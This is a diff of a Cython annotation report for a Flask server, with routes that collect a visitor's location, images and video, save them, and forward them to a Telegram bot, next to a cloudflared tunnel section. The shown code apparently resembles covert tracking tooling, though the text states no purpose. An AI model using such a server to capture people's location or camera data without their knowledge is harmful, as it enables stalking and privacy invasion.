-<pre class="cython line score-4" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">064</span>:     if latitude and longitude:</pre>
+<pre class="cython line score-4" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">064</span>:     <span class="k">if</span> <span class="n">latitude</span> <span class="ow">and</span> <span class="n">longitude</span><span class="p">:</span></pre>
 <pre class='cython code score-4 '>  __pyx_t_5 = <span class='pyx_c_api'>__Pyx_PyObject_IsTrue</span>(__pyx_v_latitude); if (unlikely((__pyx_t_5 &lt; 0))) <span class='error_goto'>__PYX_ERR(0, 64, __pyx_L1_error)</span>
   if (__pyx_t_5) {
   } else {
@@ -1722,7 +1797,7 @@ static PyObject *__pyx_pf_4main_10upload_location(CYTHON_UNUSED PyObject *__pyx_
   if (__pyx_t_4) {
 /* … */
   }
-</pre><pre class="cython line score-17" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">065</span>:         send_location_telegram(latitude, longitude, accuracy, source, BOT_TOKEN, CHAT_ID)</pre>
+</pre><pre class="cython line score-17" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">065</span>:         <span class="n">send_location_telegram</span><span class="p">(</span><span class="n">latitude</span><span class="p">,</span> <span class="n">longitude</span><span class="p">,</span> <span class="n">accuracy</span><span class="p">,</span> <span class="n">source</span><span class="p">,</span> <span class="n">BOT_TOKEN</span><span class="p">,</span> <span class="n">CHAT_ID</span><span class="p">)</span></pre>
 <pre class='cython code score-17 '>    __pyx_t_2 = NULL;
     <span class='pyx_c_api'>__Pyx_GetModuleGlobalName</span>(__pyx_t_6, __pyx_mstate_global-&gt;__pyx_n_u_send_location_telegram);<span class='error_goto'> if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 65, __pyx_L1_error)</span>
     <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_6);
@@ -1748,7 +1823,7 @@ static PyObject *__pyx_pf_4main_10upload_location(CYTHON_UNUSED PyObject *__pyx_
     }
     <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_1); __pyx_t_1 = 0;
 </pre><pre class="cython line score-0">&#xA0;<span class="">066</span>: </pre>
-<pre class="cython line score-25" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">067</span>:     return jsonify({"status": "ok"})</pre>
+<pre class="cython line score-25" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">067</span>:     <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">&quot;status&quot;</span><span class="p">:</span> <span class="s">&quot;ok&quot;</span><span class="p">})</span></pre>
 <pre class='cython code score-25 '>  <span class='pyx_macro_api'>__Pyx_XDECREF</span>(__pyx_r);
   __pyx_t_6 = NULL;
   <span class='pyx_c_api'>__Pyx_GetModuleGlobalName</span>(__pyx_t_2, __pyx_mstate_global-&gt;__pyx_n_u_jsonify);<span class='error_goto'> if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 67, __pyx_L1_error)</span>
@@ -1781,7 +1856,7 @@ static PyObject *__pyx_pf_4main_10upload_location(CYTHON_UNUSED PyObject *__pyx_
   __pyx_t_1 = 0;
   goto __pyx_L0;
 </pre><pre class="cython line score-0">&#xA0;<span class="">068</span>: </pre>
-<pre class="cython line score-51" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">069</span>: @app.route("/upload/image", methods=["POST"])</pre>
+<pre class="cython line score-51" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">069</span>: <span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s">&quot;/upload/image&quot;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">&quot;POST&quot;</span><span class="p">])</span></pre>
 <pre class='cython code score-51 '>/* Python wrapper */
 static PyObject *__pyx_pw_4main_13upload_image(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
 static PyMethodDef __pyx_mdef_4main_13upload_image = {"upload_image", (PyCFunction)__pyx_pw_4main_13upload_image, METH_NOARGS, 0};
@@ -1869,8 +1944,8 @@ static PyObject *__pyx_pf_4main_12upload_image(CYTHON_UNUSED PyObject *__pyx_sel
   }
   if (<span class='py_c_api'>PyDict_SetItem</span>(__pyx_mstate_global-&gt;__pyx_d, __pyx_mstate_global-&gt;__pyx_n_u_upload_image_2, __pyx_t_2) &lt; (0)) <span class='error_goto'>__PYX_ERR(0, 69, __pyx_L1_error)</span>
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_2); __pyx_t_2 = 0;
-</pre><pre class="cython line score-0">&#xA0;<span class="">070</span>: def upload_image():</pre>
-<pre class="cython line score-5" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">071</span>:     data = request.json</pre>
+</pre><pre class="cython line score-0">&#xA0;<span class="">070</span>: <span class="k">def</span><span class="w"> </span><span class="nf">upload_image</span><span class="p">():</span></pre>
+<pre class="cython line score-5" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">071</span>:     <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span></pre>
 <pre class='cython code score-5 '>  <span class='pyx_c_api'>__Pyx_GetModuleGlobalName</span>(__pyx_t_1, __pyx_mstate_global-&gt;__pyx_n_u_request);<span class='error_goto'> if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 71, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_1);
   __pyx_t_2 = <span class='pyx_c_api'>__Pyx_PyObject_GetAttrStr</span>(__pyx_t_1, __pyx_mstate_global-&gt;__pyx_n_u_json);<span class='error_goto'> if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 71, __pyx_L1_error)</span>
@@ -1878,7 +1953,7 @@ static PyObject *__pyx_pf_4main_12upload_image(CYTHON_UNUSED PyObject *__pyx_sel
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_1); __pyx_t_1 = 0;
   __pyx_v_data = __pyx_t_2;
   __pyx_t_2 = 0;
-</pre><pre class="cython line score-30" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">072</span>:     img = base64.b64decode(data["original"].split(",")[1])</pre>
+</pre><pre class="cython line score-30" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">072</span>:     <span class="n">img</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="s">&quot;original&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&quot;,&quot;</span><span class="p">)[</span><span class="mf">1</span><span class="p">])</span></pre>
 <pre class='cython code score-30 '>  __pyx_t_1 = NULL;
   <span class='pyx_c_api'>__Pyx_GetModuleGlobalName</span>(__pyx_t_3, __pyx_mstate_global-&gt;__pyx_n_u_base64);<span class='error_goto'> if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 72, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_3);
@@ -1924,7 +1999,7 @@ static PyObject *__pyx_pf_4main_12upload_image(CYTHON_UNUSED PyObject *__pyx_sel
   }
   __pyx_v_img = __pyx_t_2;
   __pyx_t_2 = 0;
-</pre><pre class="cython line score-31" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">073</span>:     path = f"{UPLOAD_DIR}/img_{int(time.time())}.png"</pre>
+</pre><pre class="cython line score-31" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">073</span>:     <span class="n">path</span> <span class="o">=</span> <span class="n">f</span><span class="s">&quot;{UPLOAD_DIR}/img_{int(time.time())}.png&quot;</span></pre>
 <pre class='cython code score-31 '>  <span class='pyx_c_api'>__Pyx_GetModuleGlobalName</span>(__pyx_t_2, __pyx_mstate_global-&gt;__pyx_n_u_UPLOAD_DIR);<span class='error_goto'> if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 73, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_2);
   __pyx_t_4 = <span class='pyx_c_api'>__Pyx_PyObject_FormatSimple</span>(__pyx_t_2, __pyx_mstate_global-&gt;__pyx_empty_unicode);<span class='error_goto'> if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 73, __pyx_L1_error)</span>
@@ -1955,7 +2030,7 @@ static PyObject *__pyx_pf_4main_12upload_image(CYTHON_UNUSED PyObject *__pyx_sel
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_2); __pyx_t_2 = 0;
   __pyx_v_path = ((PyObject*)__pyx_t_6);
   __pyx_t_6 = 0;
-</pre><pre class="cython line score-61" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">074</span>:     with open(path, "wb") as f:</pre>
+</pre><pre class="cython line score-61" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">074</span>:     <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">&quot;wb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span></pre>
 <pre class='cython code score-61 '>  /*with:*/ {
     __pyx_t_2 = NULL;
     __pyx_t_7 = 1;
@@ -2075,7 +2150,7 @@ static PyObject *__pyx_pf_4main_12upload_image(CYTHON_UNUSED PyObject *__pyx_sel
     goto __pyx_L1_error;
     __pyx_L16:;
   }
-</pre><pre class="cython line score-5" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">075</span>:         f.write(img)</pre>
+</pre><pre class="cython line score-5" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">075</span>:         <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">img</span><span class="p">)</span></pre>
 <pre class='cython code score-5 '>          __pyx_t_6 = __pyx_v_f;
           <span class='pyx_macro_api'>__Pyx_INCREF</span>(__pyx_t_6);
           __pyx_t_7 = 0;
@@ -2088,7 +2163,7 @@ static PyObject *__pyx_pf_4main_12upload_image(CYTHON_UNUSED PyObject *__pyx_sel
           }
           <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_1); __pyx_t_1 = 0;
 </pre><pre class="cython line score-0">&#xA0;<span class="">076</span>: </pre>
-<pre class="cython line score-8" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">077</span>:     BOT_TOKEN = app.config["BOT_TOKEN"]</pre>
+<pre class="cython line score-8" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">077</span>:     <span class="n">BOT_TOKEN</span> <span class="o">=</span> <span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s">&quot;BOT_TOKEN&quot;</span><span class="p">]</span></pre>
 <pre class='cython code score-8 '>  <span class='pyx_c_api'>__Pyx_GetModuleGlobalName</span>(__pyx_t_2, __pyx_mstate_global-&gt;__pyx_n_u_app);<span class='error_goto'> if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 77, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_2);
   __pyx_t_6 = <span class='pyx_c_api'>__Pyx_PyObject_GetAttrStr</span>(__pyx_t_2, __pyx_mstate_global-&gt;__pyx_n_u_config);<span class='error_goto'> if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 77, __pyx_L1_error)</span>
@@ -2099,7 +2174,7 @@ static PyObject *__pyx_pf_4main_12upload_image(CYTHON_UNUSED PyObject *__pyx_sel
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_6); __pyx_t_6 = 0;
   __pyx_v_BOT_TOKEN = __pyx_t_2;
   __pyx_t_2 = 0;
-</pre><pre class="cython line score-8" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">078</span>:     CHAT_ID = app.config["CHAT_ID"]</pre>
+</pre><pre class="cython line score-8" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">078</span>:     <span class="n">CHAT_ID</span> <span class="o">=</span> <span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s">&quot;CHAT_ID&quot;</span><span class="p">]</span></pre>
 <pre class='cython code score-8 '>  <span class='pyx_c_api'>__Pyx_GetModuleGlobalName</span>(__pyx_t_2, __pyx_mstate_global-&gt;__pyx_n_u_app);<span class='error_goto'> if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 78, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_2);
   __pyx_t_6 = <span class='pyx_c_api'>__Pyx_PyObject_GetAttrStr</span>(__pyx_t_2, __pyx_mstate_global-&gt;__pyx_n_u_config);<span class='error_goto'> if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 78, __pyx_L1_error)</span>
@@ -2110,7 +2185,7 @@ static PyObject *__pyx_pf_4main_12upload_image(CYTHON_UNUSED PyObject *__pyx_sel
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_6); __pyx_t_6 = 0;
   __pyx_v_CHAT_ID = __pyx_t_2;
   __pyx_t_2 = 0;
-</pre><pre class="cython line score-17" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">079</span>:     send_photo(path, BOT_TOKEN, CHAT_ID)</pre>
+</pre><pre class="cython line score-17" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">079</span>:     <span class="n">send_photo</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">BOT_TOKEN</span><span class="p">,</span> <span class="n">CHAT_ID</span><span class="p">)</span></pre>
 <pre class='cython code score-17 '>  __pyx_t_6 = NULL;
   <span class='pyx_c_api'>__Pyx_GetModuleGlobalName</span>(__pyx_t_1, __pyx_mstate_global-&gt;__pyx_n_u_send_photo);<span class='error_goto'> if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 79, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_1);
@@ -2135,7 +2210,7 @@ static PyObject *__pyx_pf_4main_12upload_image(CYTHON_UNUSED PyObject *__pyx_sel
     <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_2);
   }
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_2); __pyx_t_2 = 0;
-</pre><pre class="cython line score-25" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">080</span>:     return jsonify({"status": "ok"})</pre>
+</pre><pre class="cython line score-25" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">080</span>:     <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">&quot;status&quot;</span><span class="p">:</span> <span class="s">&quot;ok&quot;</span><span class="p">})</span></pre>
 <pre class='cython code score-25 '>  <span class='pyx_macro_api'>__Pyx_XDECREF</span>(__pyx_r);
   __pyx_t_1 = NULL;
   <span class='pyx_c_api'>__Pyx_GetModuleGlobalName</span>(__pyx_t_6, __pyx_mstate_global-&gt;__pyx_n_u_jsonify);<span class='error_goto'> if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 80, __pyx_L1_error)</span>
@@ -2168,7 +2243,7 @@ static PyObject *__pyx_pf_4main_12upload_image(CYTHON_UNUSED PyObject *__pyx_sel
   __pyx_t_2 = 0;
   goto __pyx_L0;
 </pre><pre class="cython line score-0">&#xA0;<span class="">081</span>: </pre>
-<pre class="cython line score-47" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">082</span>: @app.route("/upload/video", methods=["POST"])</pre>
+<pre class="cython line score-47" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">082</span>: <span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s">&quot;/upload/video&quot;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">&quot;POST&quot;</span><span class="p">])</span></pre>
 <pre class='cython code score-47 '>/* Python wrapper */
 static PyObject *__pyx_pw_4main_15upload_video(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
 static PyMethodDef __pyx_mdef_4main_15upload_video = {"upload_video", (PyCFunction)__pyx_pw_4main_15upload_video, METH_NOARGS, 0};
@@ -2250,8 +2325,8 @@ static PyObject *__pyx_pf_4main_14upload_video(CYTHON_UNUSED PyObject *__pyx_sel
   }
   if (<span class='py_c_api'>PyDict_SetItem</span>(__pyx_mstate_global-&gt;__pyx_d, __pyx_mstate_global-&gt;__pyx_n_u_upload_video_2, __pyx_t_2) &lt; (0)) <span class='error_goto'>__PYX_ERR(0, 82, __pyx_L1_error)</span>
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_2); __pyx_t_2 = 0;
-</pre><pre class="cython line score-0">&#xA0;<span class="">083</span>: def upload_video():</pre>
-<pre class="cython line score-8" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">084</span>:     file = request.files["original"]</pre>
+</pre><pre class="cython line score-0">&#xA0;<span class="">083</span>: <span class="k">def</span><span class="w"> </span><span class="nf">upload_video</span><span class="p">():</span></pre>
+<pre class="cython line score-8" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">084</span>:     <span class="nb">file</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">files</span><span class="p">[</span><span class="s">&quot;original&quot;</span><span class="p">]</span></pre>
 <pre class='cython code score-8 '>  <span class='pyx_c_api'>__Pyx_GetModuleGlobalName</span>(__pyx_t_1, __pyx_mstate_global-&gt;__pyx_n_u_request);<span class='error_goto'> if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 84, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_1);
   __pyx_t_2 = <span class='pyx_c_api'>__Pyx_PyObject_GetAttrStr</span>(__pyx_t_1, __pyx_mstate_global-&gt;__pyx_n_u_files);<span class='error_goto'> if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 84, __pyx_L1_error)</span>
@@ -2262,7 +2337,7 @@ static PyObject *__pyx_pf_4main_14upload_video(CYTHON_UNUSED PyObject *__pyx_sel
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_2); __pyx_t_2 = 0;
   __pyx_v_file = __pyx_t_1;
   __pyx_t_1 = 0;
-</pre><pre class="cython line score-31" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">085</span>:     path = f"{UPLOAD_DIR}/vid_{int(time.time())}.webm"</pre>
+</pre><pre class="cython line score-31" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">085</span>:     <span class="n">path</span> <span class="o">=</span> <span class="n">f</span><span class="s">&quot;{UPLOAD_DIR}/vid_{int(time.time())}.webm&quot;</span></pre>
 <pre class='cython code score-31 '>  <span class='pyx_c_api'>__Pyx_GetModuleGlobalName</span>(__pyx_t_1, __pyx_mstate_global-&gt;__pyx_n_u_UPLOAD_DIR);<span class='error_goto'> if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 85, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_1);
   __pyx_t_2 = <span class='pyx_c_api'>__Pyx_PyObject_FormatSimple</span>(__pyx_t_1, __pyx_mstate_global-&gt;__pyx_empty_unicode);<span class='error_goto'> if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 85, __pyx_L1_error)</span>
@@ -2293,7 +2368,7 @@ static PyObject *__pyx_pf_4main_14upload_video(CYTHON_UNUSED PyObject *__pyx_sel
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_1); __pyx_t_1 = 0;
   __pyx_v_path = ((PyObject*)__pyx_t_3);
   __pyx_t_3 = 0;
-</pre><pre class="cython line score-5" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">086</span>:     file.save(path)</pre>
+</pre><pre class="cython line score-5" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">086</span>:     <span class="nb">file</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="n">path</span><span class="p">)</span></pre>
 <pre class='cython code score-5 '>  __pyx_t_1 = __pyx_v_file;
   <span class='pyx_macro_api'>__Pyx_INCREF</span>(__pyx_t_1);
   __pyx_t_5 = 0;
@@ -2306,7 +2381,7 @@ static PyObject *__pyx_pf_4main_14upload_video(CYTHON_UNUSED PyObject *__pyx_sel
   }
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_3); __pyx_t_3 = 0;
 </pre><pre class="cython line score-0">&#xA0;<span class="">087</span>: </pre>
-<pre class="cython line score-8" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">088</span>:     BOT_TOKEN = app.config["BOT_TOKEN"]</pre>
+<pre class="cython line score-8" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">088</span>:     <span class="n">BOT_TOKEN</span> <span class="o">=</span> <span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s">&quot;BOT_TOKEN&quot;</span><span class="p">]</span></pre>
 <pre class='cython code score-8 '>  <span class='pyx_c_api'>__Pyx_GetModuleGlobalName</span>(__pyx_t_3, __pyx_mstate_global-&gt;__pyx_n_u_app);<span class='error_goto'> if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 88, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_3);
   __pyx_t_1 = <span class='pyx_c_api'>__Pyx_PyObject_GetAttrStr</span>(__pyx_t_3, __pyx_mstate_global-&gt;__pyx_n_u_config);<span class='error_goto'> if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 88, __pyx_L1_error)</span>
@@ -2317,7 +2392,7 @@ static PyObject *__pyx_pf_4main_14upload_video(CYTHON_UNUSED PyObject *__pyx_sel
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_1); __pyx_t_1 = 0;
   __pyx_v_BOT_TOKEN = __pyx_t_3;
   __pyx_t_3 = 0;
-</pre><pre class="cython line score-8" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">089</span>:     CHAT_ID = app.config["CHAT_ID"]</pre>
+</pre><pre class="cython line score-8" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">089</span>:     <span class="n">CHAT_ID</span> <span class="o">=</span> <span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s">&quot;CHAT_ID&quot;</span><span class="p">]</span></pre>
 <pre class='cython code score-8 '>  <span class='pyx_c_api'>__Pyx_GetModuleGlobalName</span>(__pyx_t_3, __pyx_mstate_global-&gt;__pyx_n_u_app);<span class='error_goto'> if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 89, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_3);
   __pyx_t_1 = <span class='pyx_c_api'>__Pyx_PyObject_GetAttrStr</span>(__pyx_t_3, __pyx_mstate_global-&gt;__pyx_n_u_config);<span class='error_goto'> if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 89, __pyx_L1_error)</span>
@@ -2328,7 +2403,7 @@ static PyObject *__pyx_pf_4main_14upload_video(CYTHON_UNUSED PyObject *__pyx_sel
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_1); __pyx_t_1 = 0;
   __pyx_v_CHAT_ID = __pyx_t_3;
   __pyx_t_3 = 0;
-</pre><pre class="cython line score-17" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">090</span>:     send_video(path, BOT_TOKEN, CHAT_ID)</pre>
+</pre><pre class="cython line score-17" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">090</span>:     <span class="n">send_video</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">BOT_TOKEN</span><span class="p">,</span> <span class="n">CHAT_ID</span><span class="p">)</span></pre>
 <pre class='cython code score-17 '>  __pyx_t_1 = NULL;
   <span class='pyx_c_api'>__Pyx_GetModuleGlobalName</span>(__pyx_t_2, __pyx_mstate_global-&gt;__pyx_n_u_send_video);<span class='error_goto'> if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 90, __pyx_L1_error)</span>
   <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_2);
@@ -2353,7 +2428,7 @@ static PyObject *__pyx_pf_4main_14upload_video(CYTHON_UNUSED PyObject *__pyx_sel
     <span class='refnanny'>__Pyx_GOTREF</span>(__pyx_t_3);
   }
   <span class='pyx_macro_api'>__Pyx_DECREF</span>(__pyx_t_3); __pyx_t_3 = 0;
-</pre><pre class="cython line score-25" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">091</span>:     return jsonify({"status": "ok"})</pre>
+</pre><pre class="cython line score-25" onclick="(function(f,s,c){c=f.nodeValue=='+';s.display=c?'block':'none';f.nodeValue=c?'−':'+'})(this.firstChild,this.nextElementSibling.style)">+<span class="">091</span>:     <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">&quot;status&quot;</span><span class="p">:</span> <span class="s">&quot;ok&quot;</span><span class="p">})</span></pre>
 <pre class='cython code score-25 '>  <span class='pyx_macro_api'>__Pyx_XDECREF</span>(__pyx_r);
   __pyx_t_2 = NULL;
   <span class='pyx_c_api'>__Pyx_GetModuleGlobalName</span>(__pyx_t_1, __pyx_mstate_global-&gt;__pyx_n_u_jsonify);<span class='error_goto'> if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 91, __pyx_L1_error)</span>
@@ -2386,8 +2461,8 @@ static PyObject *__pyx_pf_4main_14upload_video(CYTHON_UNUSED PyObject *__pyx_sel
   __pyx_t_3 = 0;
   goto __pyx_L0;
 </pre><pre class="cython line score-0">&#xA0;<span class="">092</span>: </pre>
-<pre class="cython line score-0">&#xA0;<span class="">093</span>: # ================= CLOUDFLARED TUNNEL =================</pre>
